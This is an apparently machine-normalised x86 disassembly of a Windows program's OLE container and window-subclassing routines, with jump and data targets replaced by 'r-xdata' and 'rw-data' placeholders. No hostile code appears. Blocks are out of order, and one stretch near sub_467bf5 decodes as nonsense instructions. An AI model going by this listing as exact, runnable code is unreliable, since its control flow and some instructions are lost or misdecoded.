xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_466b04
push ebx
mov ebx eax
lea ecx [ ebx + 0x238 ]
mov eax [ ebx + 0x208 ]
lea edx [ eax + 0x10 ]
mov eax [ ebx + 0x218 ]
call sub_463224
lea ecx [ ebx + 0x234 ]
mov edx r-xdata
mov eax [ ebx + 0x218 ]
call sub_463224
lea eax [ ebx + 0x228 ]
call sub_4059cc
lea eax [ ebx + 0x224 ]
call sub_4059cc
lea eax [ ebx + 0x220 ]
call sub_4059cc
pop ebx
retn
sub_466b6c
push ebx
push esi
push edi
mov ebx [ eax + 0x208 ]
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x4c ]
call sub_40324c
xor eax eax
mov [ ebx + 0x4c ] eax
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x4c ]
call sub_41a238
call sub_40324c
inc edi
dec esi
jne r-xdata
sub_466bcc
push ebx
mov ebx eax
test [ ebx + 0x23d ] 0x4
jne r-xdata
mov eax ebx
call sub_443fa0
pop ebx
retn
mov eax [ ebx + 0x174 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x180 ]
push eax
call SetWindowLongA
cmp [ ebx + 0x218 ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0x180 ] eax
pop ebx
retn
push 0x1
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
sub_466c18
push ebx
push esi
push edi
push ecx
mov ebx eax
mov ecx [ ebx + 0x208 ]
mov edi [ ecx + 0x20 ]
mov esi [ ecx + 0x24 ]
xor eax eax
jmp r-xdata
cmp eax edi
jne r-xdata
cmp edx [ esi + eax * 4 ]
je r-xdata
xor eax eax
xor edx edx
jmp r-xdata
push eax
cmp [ ecx + 0x30 ] 0x191
jb r-xdata
inc eax
pop ecx
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
pop edi
pop esi
pop ebx
retn
mov eax [ ebx ]
call sub_4031d8
call sub_403214
add eax 0x7
and eax 0xfffffff8
mov eax [ ecx + 0x50 ]
test eax eax
jne r-xdata
add ebx eax
pop eax
mov edx [ ebx + eax * 8 + 0x4 ]
mov eax [ ebx + eax * 8 ]
sub_466c8c
push ebx
push esi
xor esi esi
call sub_457218
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov edx [ rw-data ]
mov esi [ eax + 0x248 ]
mov esi [ ebx + 0x248 ]
jmp r-xdata
sub_466cf0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax esi
call sub_40f1e8
mov ecx esi
mov edx edi
mov eax ebx
call sub_466d10
pop edi
pop esi
pop ebx
retn
sub_466d10
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
lea eax [ ebp - 0x20 ]
mov edx [ r-xdata ]
call sub_404934
xor eax eax
push ebp
push sub_466d92
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4663a4
mov [ esi ] 0x0
push 0x0
lea eax [ ebp - 0x20 ]
push eax
push esi
push rw-data
push 0x2
push 0x0
mov eax [ rw-data ]
push eax
push edi
mov eax [ ebx + 0x224 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466d99
lea eax [ ebp - 0x20 ]
mov edx [ r-xdata ]
call sub_404a04
retn
lea edx [ ebp - 0x20 ]
call sub_463ab8
sub_466da0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_466dee
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax ebx
call sub_466dfc
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_412778
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_466df5
lea eax [ ebp - 0x10 ]
call sub_40f1fc
retn
sub_466dfc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_466cf0
pop edi
pop esi
pop ebx
retn
sub_466e14
push ebx
push esi
push ecx
mov ebx eax
cmp [ ebx + 0x22c ] 0x0
je r-xdata
pop edx
pop esi
pop ebx
retn
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
xor eax eax
mov [ esp ] eax
push esp
mov eax [ ebx + 0x22c ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
cmp [ esp ] 0x0
jne r-xdata
mov esi [ esp ]
mov [ ebx + 0x180 ] esi
push 0xfffffffc
push esi
call GetWindowLongA
mov [ ebx + 0x174 ] eax
mov eax [ rw-data ]
mov [ eax ] ebx
push sub_43d1b8
push 0xfffffffc
mov eax [ ebx + 0x180 ]
push eax
call SetWindowLongA
push 0x0
push 0x0
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call SendMessageA
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9f4
call sub_4039d8
sub_466ea4
push ebx
push esi
push ebp
mov ebp esp
mov ebx eax
mov edx [ ebx + 0xc ]
test edx edx
je r-xdata
mov edx [ ebx + 0x8 ]
mov eax [ ebx + 0x4 ]
call [ ebx ]
mov esp ebp
pop ebp
pop esi
pop ebx
retn
xor eax eax
lea esi [ ebx + 0x10 ]
push [ esi + 0x8 ]
je r-xdata
mov al [ esi ]
cmp al 0x1
ja r-xdata
push [ esi + 0x4 ]
test ah ah
jne r-xdata
mov ecx [ esi + 0x4 ]
mov ah 0x1
jmp r-xdata
add esi 0xc
dec edx
jne r-xdata
sub_466ee4
push ebp
mov ebp esp
add esp 0xfffffd64
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] eax
lea ecx [ ebp - 0x29c ]
mov eax [ ebp - 0x4 ]
call sub_466c18
cmp [ ebp - 0x29c ] 0x10000
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push j_sub_4036ec#2
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov edx [ ebx + 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x294 ] eax
mov eax edx
mov [ ebp - 0x290 ] eax
test edx edx
je r-xdata
lea eax [ ebp - 0x29c ]
call sub_466ea4
mov ebx [ ebp - 0xc ]
test ebx ebx
je r-xdata
add eax eax
mov edx [ ebx ]
lea eax [ edx + eax * 8 ]
mov ebx eax
lea esi [ ebp - 0x28c ]
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec ebx
lea esi [ ebp + ebx * 8 - 0x10c ]
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx eax
sub edx 0x4
je r-xdata
mov [ esi ] 0x0
mov edx [ ebp - 0xc ]
lea edi [ ebp + edx * 8 - 0x10c ]
xor edx edx
mov [ edi ] edx
test ah 0x40
je r-xdata
mov ebx [ ebp - 0xc ]
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
mov eax [ esi ]
call sub_404dc4
mov edx [ esi + 0x4 ]
mov [ edx ] eax
mov [ esi ] 0x1
mov eax [ ebx + 0x8 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
dec edx
sub edx 0x3
jb r-xdata
mov edx edi
mov eax [ ebx + 0x8 ]
call sub_404da0
xor eax eax
mov [ edi + 0x4 ] eax
mov eax [ edi ]
mov [ esi + 0x4 ] eax
mov edx edi
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_404da0
mov eax [ ebx + 0x8 ]
mov [ edi + 0x4 ] eax
mov [ esi + 0x4 ] edi
jmp r-xdata
dec ebx
lea eax [ ebp + ebx * 8 - 0x10c ]
call sub_403f9c
test ebx ebx
jne r-xdata
add esi 0xc
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x290 ]
jne r-xdata
mov [ esi ] 0x2
mov eax [ ebx + 0x8 ]
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0xc ]
mov [ esi + 0x8 ] eax
jmp r-xdata
dec edx
je r-xdata
inc [ ebp - 0xc ]
jmp r-xdata
sub ebx 0x10
mov eax [ ebx ]
and eax 0xffff
mov edx eax
and edx 0xfff
cmp edx 0x8
jne r-xdata
mov [ esi ] 0x0
mov [ esi + 0x4 ] ebx
jmp r-xdata
jmp r-xdata
mov [ esi ] 0x0
test ah 0x20
je r-xdata
mov eax [ ebx + 0x8 ]
mov [ esi + 0x4 ] eax
mov [ esi + 0x4 ] ebx
jmp r-xdata
sub_467084
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x208 ]
cmp [ eax + 0x30 ] 0x12c
jge r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
call sub_466c18
cmp [ ebp - 0x10 ] 0x10000
jl r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_466ee4
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
push ebp
push sub_467141
push [ fs : eax ]
mov [ fs : eax ] esp
push ebx
push esi
mov esi [ ebp - 0x4 ]
mov ebx [ esi + 0x8 ]
test ebx ebx
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call [ ebp - 0x10 ]
pop esi
pop ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov esi [ esi ]
mov eax ebx
shl eax 0x4
xor edx edx
add esi eax
cmp ax 0x7
ja r-xdata
je r-xdata
test dl dl
jne r-xdata
push [ esi + 0xc ]
push [ esi + 0x8 ]
test eax 0x2000
je r-xdata
mov ecx esi
inc dl
test eax 0x2000
jne r-xdata
sub esi 0x10
mov eax [ esi ]
cmp ax 0x4
ja r-xdata
push esi
jmp r-xdata
dec ebx
jne r-xdata
mov ecx [ esi + 0x8 ]
jmp r-xdata
sub_467168
push ebx
push esi
push ecx
mov [ esp ] dl
mov esi eax
xor ebx ebx
mov eax esi
call sub_446ee8
and al [ esp ]
je r-xdata
test bl bl
jne r-xdata
push 0x0
push 0x0
push 0x30f
mov eax esi
call sub_446be4
push eax
mov eax [ esi + 0x174 ]
push eax
call CallWindowProcA
test eax eax
setne bl
mov eax ebx
pop edx
pop esi
pop ebx
retn
mov dl [ esp ]
mov eax esi
call sub_445e74
mov ebx eax
sub_4671b8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov ebx [ esi + 0x244 ]
test ebx ebx
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
mov eax [ ebx + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov ebx eax
xor edi edi
inc edi
dec ebx
jne r-xdata
mov eax ebp
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov edx edi
mov eax [ esi + 0x244 ]
call sub_41a238
cmp ebp eax
jne r-xdata
mov edx [ esi + 0x208 ]
mov edx [ edx + 0x40 ]
mov edx [ edx + edi * 4 ]
mov ecx eax
mov eax esi
call sub_467588
jmp r-xdata
sub_467224
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_466bac
xor eax eax
push ebp
push j_sub_4036ec
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
push eax
push 0x2
call GlobalAlloc
mov esi eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x214 ] esi
test esi esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
push eax
call GlobalLock
mov esi eax
xor eax eax
push ebp
push sub_4672b5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4672bc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
push eax
call GlobalUnlock
retn
call sub_40b92c
sub_4672de
mov eax eax
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov eax [ ebx + 0x48 ]
cmp esi eax
je r-xdata
mov edx [ ebx + 0x4c ]
cmp edx [ ebp + 0x8 ]
je r-xdata
test eax eax
jg r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_446598
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test edx edx
jle r-xdata
test [ ebx + 0x23d ] 0x4
jne r-xdata
mov esi [ ebx + 0x48 ]
mov eax [ ebx + 0x4c ]
mov [ ebp + 0x8 ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x40 ]
push eax
push 0x9ec
mov eax [ ebp + 0x8 ]
push eax
call MulDiv
push eax
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x40 ]
push eax
push 0x9ec
push esi
call MulDiv
lea ecx [ ebp - 0x10 ]
pop edx
call sub_418ddc
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x44 ]
test eax eax
je r-xdata
sub_4673c0
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_467466
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x8 ]
call sub_404034
mov edx esi
mov eax ebx
call sub_4401ac
cmp [ ebx + 0x220 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46746d
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fc0
retn
push 0xfffffd42
mov eax [ ebx + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
mov eax [ ebx + 0x208 ]
mov eax [ eax + 0x2c ]
test al 0x30
je r-xdata
test al 0x10
je r-xdata
mov edi 0xfffffdfb
mov edi 0xfffffdfa
jmp r-xdata
mov ecx esi
mov edx edi
mov eax ebx
call sub_467730
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_466da0
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4043a8
jne r-xdata
sub_4674a6
mov eax eax
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_467578
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_440298
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46757f
lea eax [ ebp - 0x8 ]
call sub_4059cc
retn
xor eax eax
push ebp
push sub_46750d
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
call sub_4059cc
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
call sub_462f6c
sub eax 0xfffffd9c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x220 ] 0x0
je r-xdata
push 0xffffffff
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
sub_467512
or ebx 0xffffffff
call sub_403a54
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
call sub_462f6c
sub eax 0xfffffd9c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x220 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46757f
lea eax [ ebp - 0x8 ]
call sub_4059cc
retn
push 0xffffffff
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
sub_467588
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46766a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467671
lea eax [ ebp - 0x10 ]
call sub_4059cc
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x248 ] 0x1
xor eax eax
push ebp
push sub_46764d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x244 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x248 ] 0x0
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x244 ]
mov edx ebx
call sub_41a238
mov edi eax
mov edx [ ebp - 0xc ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_464424
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_467390
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov eax [ eax + 0x40 ]
mov eax [ eax + ebx * 4 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
sub_467678
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
lea eax [ ebp - 0x30 ]
mov edx [ r-xdata ]
call sub_404934
xor eax eax
push ebp
push sub_46771f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_4663a4
mov [ ebp - 0x10 ] esi
mov eax rw-data
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x1
mov [ ebp - 0x4 ] 0x1
cmp [ esi ] 0x9
je r-xdata
mov eax 0x8
mov eax 0x4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467726
lea eax [ ebp - 0x30 ]
mov edx [ r-xdata ]
call sub_404a04
retn
lea edx [ ebp - 0x30 ]
call sub_463ab8
push 0x0
lea edx [ ebp - 0x30 ]
push edx
push 0x0
lea edx [ ebp - 0x10 ]
push edx
push eax
push 0x0
mov eax [ rw-data ]
push eax
push edi
mov eax [ ebx + 0x224 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
test eax eax
je r-xdata
sub_467730
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov [ ebp - 0x10 ] 0x8
mov eax edi
call sub_404dc4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_467780
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax ebx
call sub_467678
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467787
mov eax [ ebp - 0x8 ]
push eax
call SysFreeString
retn
sub_467790
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax esi
call sub_457218
mov edi eax
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
cmp esi [ edi + 0x27c ]
jne r-xdata
mov eax [ edi + 0x27c ]
test eax eax
je r-xdata
xor eax eax
mov [ edi + 0x27c ] eax
mov [ edi + 0x27c ] esi
jmp r-xdata
cmp esi eax
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb02a
call sub_441578
sub_4677e0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46782e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
mov edx edi
call sub_4139ec
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax ebx
call sub_4674a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467835
lea eax [ ebp - 0x10 ]
call sub_40f1fc
retn
sub_46783c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ecx ]
xor eax eax
push ebp
push sub_467a17
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
add eax 0x25f
cmp eax 0x7
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
jmp [ eax * 4 + jump_table_467871 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov si 0xffeb
call sub_403448
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffe9
call sub_403448
jmp r-xdata
cmp [ ecx + 0x8 ] 0x2
jl r-xdata
cmp [ ecx + 0x8 ] 0x0
jle r-xdata
cmp [ ecx + 0x8 ] 0x4
jl r-xdata
lea eax [ ebx + 0x10 ]
call sub_40fe18
mov [ ebp - 0xe ] ax
mov eax ebx
call sub_40fe18
mov edi eax
sub esi 0xfffffda4
je r-xdata
mov eax ebx
call sub_40fe18
mov [ ebp - 0xf ] al
lea edx [ ebp - 0xf ]
mov eax [ ebp - 0x4 ]
mov si 0xffba
call sub_403448
test [ ebx + 0x1 ] 0x40
je r-xdata
lea eax [ ebx + 0x30 ]
call sub_40fe18
mov edi eax
and edi 0x7
lea eax [ ebx + 0x20 ]
call sub_40fe18
and eax 0x7
mov [ ebp - 0xc ] eax
mov al [ edi + rw-data ]
mov [ ebp - 0x6 ] al
mov al [ edi + rw-data ]
mov edx [ ebp - 0xc ]
or al [ edx + rw-data ]
mov [ ebp - 0x5 ] al
lea eax [ ebx + 0x10 ]
call sub_40fe18
mov edi eax
mov eax ebx
call sub_40fe18
mov [ ebp - 0xc ] eax
sub esi 0xfffffda1
je r-xdata
and edi 0x7
mov cl [ edi + rw-data ]
lea edx [ ebp - 0xe ]
mov eax [ ebp - 0x4 ]
mov si 0xffbb
call sub_403448
sub esi 0x2
jne r-xdata
mov eax [ ebx + 0x8 ]
mov dl [ ebp - 0xf ]
mov [ eax ] dl
jmp r-xdata
push edi
mov eax [ ebp - 0xc ]
push eax
mov cl [ ebp - 0x5 ]
mov dl [ ebp - 0x6 ]
mov eax [ ebp - 0x4 ]
mov si 0xffd3
call sub_403448
dec esi
je r-xdata
mov eax [ ebx + 0x18 ]
mov dx [ ebp - 0xe ]
mov [ eax ] dx
jmp r-xdata
test [ ebx + 0x11 ] 0x40
je r-xdata
and edi 0x7
mov cl [ edi + rw-data ]
lea edx [ ebp - 0xe ]
mov eax [ ebp - 0x4 ]
mov si 0xffbc
call sub_403448
jmp r-xdata
mov eax [ ebp - 0xc ]
push eax
mov ecx edi
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov si 0xffd4
call sub_403448
jmp r-xdata
dec esi
jne r-xdata
push edi
mov eax [ ebp - 0xc ]
push eax
mov cl [ ebp - 0x5 ]
mov dl [ ebp - 0x6 ]
mov eax [ ebp - 0x4 ]
mov si 0xffd5
call sub_403448
jmp r-xdata
sub_467a38
push ebx
push esi
add esp 0xffffffe4
mov esi edx
mov ebx eax
mov eax [ esi ]
cmp eax 0xbd00
jb r-xdata
mov eax [ esi ]
sub eax 0xb008
je r-xdata
cmp eax 0xbd08
ja r-xdata
cmp [ ebx + 0x59 ] 0x0
je r-xdata
dec eax
je r-xdata
cmp [ ebx + 0x230 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_4445c0
cmp [ ebx + 0x220 ] 0x0
je r-xdata
cmp [ ebx + 0x5a ] 0x0
je r-xdata
jmp r-xdata
mov eax ebx
call sub_446be4
mov [ esp ] eax
mov eax [ esi ]
sub eax 0xbc00
mov [ esp + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ esp + 0x8 ] eax
mov eax [ esi + 0x8 ]
mov [ esp + 0xc ] eax
call GetMessageTime
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] 0x115de1f1
mov [ esp + 0x18 ] 0x115de1f1
push esp
mov eax [ ebx + 0x230 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
test eax eax
jne r-xdata
push 0xfffffd41
mov eax [ ebx + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
push 0xfffffd40
mov eax [ ebx + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
jmp r-xdata
cmp [ ebx + 0x220 ] 0x0
je r-xdata
mov [ esi + 0xc ] 0x1
jmp r-xdata
push 0xfffffd43
mov eax [ ebx + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
add esp 0x1c
pop esi
pop ebx
retn
sub_467b20
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x214 ] 0x0
setne [ ebp - 0x5 ]
xor eax eax
push ebp
push j_sub_403818
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_467bdf
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
push eax
call GlobalLock
mov ebx eax
xor eax eax
push ebp
push sub_467bbc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
push eax
call GlobalSize
mov ecx eax
mov edx ebx
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467bc3
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
push eax
call GlobalUnlock
retn
mov eax [ ebp - 0x4 ]
call sub_466834
sub_467be6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_467bf5
add [ eax ] eax
add [ eax ] al
in al dx
jb r-xdata
retn
add [ ecx ] al
jl r-xdata
mov eax eax
push ebx
push esi
push edi
add esp 0xffffffb0
mov edi edx
mov ebx eax
test [ ebx + 0x23d ] 0x4
je r-xdata
add [ ecx - 0x742c743d ] cl
inc ebp
cld
mov ecx [ eax ]
call [ ecx + 0xd8 ]
test al al
jne r-xdata
mov edx edi
mov eax ebx
call sub_444d3c
mov esi [ edi + 0x4 ]
test esi esi
jne r-xdata
call sub_403a54
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_403a00
lea edx [ esp + 0x40 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x40 ]
push eax
push esi
push 0x1
mov eax [ ebx + 0x218 ]
push eax
call OleDraw
cmp [ edi + 0x4 ] 0x0
jne r-xdata
push esp
mov eax ebx
call sub_446be4
push eax
call BeginPaint
mov esi eax
add esp 0x50
pop edi
pop esi
pop ebx
retn
push esp
mov eax ebx
call sub_446be4
push eax
call EndPaint
jmp r-xdata
sub_467c28
push esi
mov esi eax
test [ esi + 0x23d ] 0x4
jne r-xdata
mov eax esi
call sub_445000
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_467cb8
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax esi
call sub_457218
mov edi eax
xor ebx ebx
mov eax edi
mov edx [ r-xdata ]
call sub_4033d8
test al al
je r-xdata
test ebx ebx
